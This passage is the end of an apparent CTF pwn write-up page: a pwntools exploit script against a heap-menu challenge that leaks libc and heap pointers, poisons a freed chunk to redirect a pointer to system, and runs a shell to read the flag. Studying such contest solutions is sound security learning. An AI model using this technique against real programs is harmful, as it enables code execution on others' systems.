    <span style="color:#66d9ef">else</span>:
        <span style="color:#66d9ef">return</span> pwn<span style="color:#f92672">.</span>process([exe<span style="color:#f92672">.</span>path] <span style="color:#f92672">+</span> argv, <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw)


<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">remote</span>(argv<span style="color:#f92672">=</span>[], <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw):
    <span style="color:#e6db74">&#39;&#39;&#39;Connect to the process on the remote host&#39;&#39;&#39;</span>
    io <span style="color:#f92672">=</span> pwn<span style="color:#f92672">.</span>connect(host, port)
    <span style="color:#66d9ef">if</span> pwn<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>GDB:
        pwn<span style="color:#f92672">.</span>gdb<span style="color:#f92672">.</span>attach(io, gdbscript<span style="color:#f92672">=</span>gdbscript)
    <span style="color:#66d9ef">return</span> io


<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">start</span>(argv<span style="color:#f92672">=</span>[], <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw):
    <span style="color:#e6db74">&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;</span>
    <span style="color:#66d9ef">if</span> pwn<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>LOCAL:
        <span style="color:#66d9ef">return</span> local(argv, <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw)
    <span style="color:#66d9ef">else</span>:
        <span style="color:#66d9ef">return</span> remote(argv, <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw)


gdbscript <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
</span><span style="color:#e6db74">continue
</span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#f92672">.</span>format(<span style="color:#f92672">**</span>locals())

io <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>


io <span style="color:#f92672">=</span> start()

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add</span>(idx, size, firstname, midname, lastname, age, bio, l<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>):
    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;5 re-age user</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;index: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, str(idx)<span style="color:#f92672">.</span>encode())
    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Enter size (1032 minimum): </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, str(size)<span style="color:#f92672">.</span>encode())
    <span style="color:#66d9ef">if</span> l:
        io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Input firstname: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, firstname)
        io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Input middlename: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, midname)
        io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Input lastname: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, lastname)
        io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Input age: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, str(age)<span style="color:#f92672">.</span>encode())
        io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Input bio: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, bio)

    <span style="color:#66d9ef">else</span>:
        io<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Input firstname: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, firstname)
        io<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Input middlename: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, midname)
        io<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Input lastname: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, lastname)
        io<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Input age: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, str(age)<span style="color:#f92672">.</span>encode())
        io<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Input bio: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, bio)



<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">show</span>(idx):
    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;5 re-age user</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;2&#34;</span>)
    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;index: &#34;</span>, str(idx)<span style="color:#f92672">.</span>encode())

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">delete</span>(idx):
    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;5 re-age user</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;3&#34;</span>)
    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;index: &#34;</span>, str(idx)<span style="color:#f92672">.</span>encode())

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">edit</span>(idx, firstname, midname, lastname, age, bio):
    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;5 re-age user</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;4&#34;</span>)
    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;index: &#34;</span>, str(idx)<span style="color:#f92672">.</span>encode())
    
    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Input firstname: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, firstname)
    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Input middlename: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, midname)
    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Input lastname: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, lastname)
    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Input age: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, str(age)<span style="color:#f92672">.</span>encode())
    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, bio)

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decrypt_pointer</span>(leak: int) <span style="color:#f92672">-&gt;</span> int:
    parts <span style="color:#f92672">=</span> []

    parts<span style="color:#f92672">.</span>append((leak <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">36</span>) <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">36</span>)
    parts<span style="color:#f92672">.</span>append((((leak <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">24</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFF</span>) <span style="color:#f92672">^</span> (parts[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">36</span>)) <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">24</span>)
    parts<span style="color:#f92672">.</span>append((((leak <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">12</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFF</span>) <span style="color:#f92672">^</span> ((parts[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">24</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFF</span>)) <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">12</span>)

    <span style="color:#66d9ef">return</span> parts[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">|</span> parts[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">|</span> parts[<span style="color:#ae81ff">2</span>]

add(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1032</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;//bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#ae81ff">1337</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>)
add(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1032</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#ae81ff">1337</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>)

<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">7</span><span style="color:#f92672">+</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>):
    add(i, <span style="color:#ae81ff">1032</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#ae81ff">1337</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>)

<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">7</span><span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>):
    delete(i)

delete(<span style="color:#ae81ff">1</span>)
edit(<span style="color:#ae81ff">0</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#ae81ff">1337</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Y&#34;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">1032</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">64</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">7</span>))

show(<span style="color:#ae81ff">0</span>)
io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Y&#34;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">1032</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">64</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">7</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> pwn<span style="color:#f92672">.</span>u64(io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1 Add</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">6</span>]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>)) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1c7cc0</span>
pwn<span style="color:#f92672">.</span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;libc: </span><span style="color:#e6db74">{</span>hex(libc<span style="color:#f92672">.</span>address)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)

add(<span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">1032</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#ae81ff">1337</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>)

delete(<span style="color:#ae81ff">9</span>)

edit(<span style="color:#ae81ff">11</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#ae81ff">1337</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;X&#34;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">1032</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">64</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">7</span>))

show(<span style="color:#ae81ff">11</span>)
io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;X&#34;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">1032</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">64</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">7</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
heap <span style="color:#f92672">=</span> decrypt_pointer(pwn<span style="color:#f92672">.</span>u64(io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1 Add</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">6</span>]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1000</span>
pwn<span style="color:#f92672">.</span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;heap: </span><span style="color:#e6db74">{</span>hex(heap)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)

environ <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xbe02f0</span>

edit(<span style="color:#ae81ff">11</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#ae81ff">1337</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;X&#34;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">1032</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">64</span>) <span style="color:#f92672">+</span> pwn<span style="color:#f92672">.</span>p64(<span style="color:#ae81ff">0x411</span>) <span style="color:#f92672">+</span> pwn<span style="color:#f92672">.</span>p64(((heap <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x2730</span>) <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">12</span>) <span style="color:#f92672">^</span> (<span style="color:#ae81ff">0x404010</span>)))

<span style="color:#75715e"># dumb</span>
add(<span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">1032</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#ae81ff">1337</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>)

<span style="color:#75715e">#===</span>

io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;5 re-age user</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;index: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, str(<span style="color:#ae81ff">13</span>)<span style="color:#f92672">.</span>encode())
io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Enter size (1032 minimum): </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, str(<span style="color:#ae81ff">1032</span>)<span style="color:#f92672">.</span>encode())
io<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Input firstname: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pwn<span style="color:#f92672">.</span>p64(libc<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xbbdf80</span>))
io<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Input middlename: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pwn<span style="color:#f92672">.</span>p64(libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>system))
io<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Input lastname: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pwn<span style="color:#f92672">.</span>p64(libc<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x71ab0</span>))
io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Input age: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, str(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">.</span>encode())
io<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Input bio: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pwn<span style="color:#f92672">.</span>p64(libc<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x4cb40</span>))

delete(<span style="color:#ae81ff">0</span>)
io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;cat flag.txt&#34;</span>)
pwn<span style="color:#f92672">.</span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;flag: </span><span style="color:#e6db74">{</span>io<span style="color:#f92672">.</span>recvline()<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)

io<span style="color:#f92672">.</span>interactive()
</code></pre></div>
                    
                    <HR width="100%" id="EOF">
		    <p style="color:#777;">Last modified on 2022-08-07</p>
                    
                </div>
            </div>
            
            
            <nav class="post-pagination">

                
                <a class="newer-posts" href="/posts/zigzag/">
			Next<br>[corCTF 2022 - pwn] zigzag
                </a>
                
                
                
                <a class="older-posts" href="/posts/catastrophe/">
			Previous<br>[diceCTF 2022 - pwn] catastrophe
                </a>
                
            </nav>
            <div class="post-comment-wrapper">
                


<div id="gitalk-container"></div>









            </div>
        </div>
    </div>


                    </div>
            </div><div id="single-column-footer">
Hugo Theme <a href="https://github.com/amazingrise/hugo-theme-diary">Diary</a> by <a href="https://risehere.net/">Rise</a>
<br>
Ported from <a href="https://mak1t0.cc/" target="_blank" rel="noreferrer noopener">Makito</a>'s <a href="https://github.com/SumiMakito/hexo-theme-journal/" target="_blank" rel="noreferrer noopener">Journal.</a> <br>
<br>

&copy;
	
	Beerware shit
	
</div>
            </div>
    
    <script src="/js/journal.js"></script>
    </body>
</html>
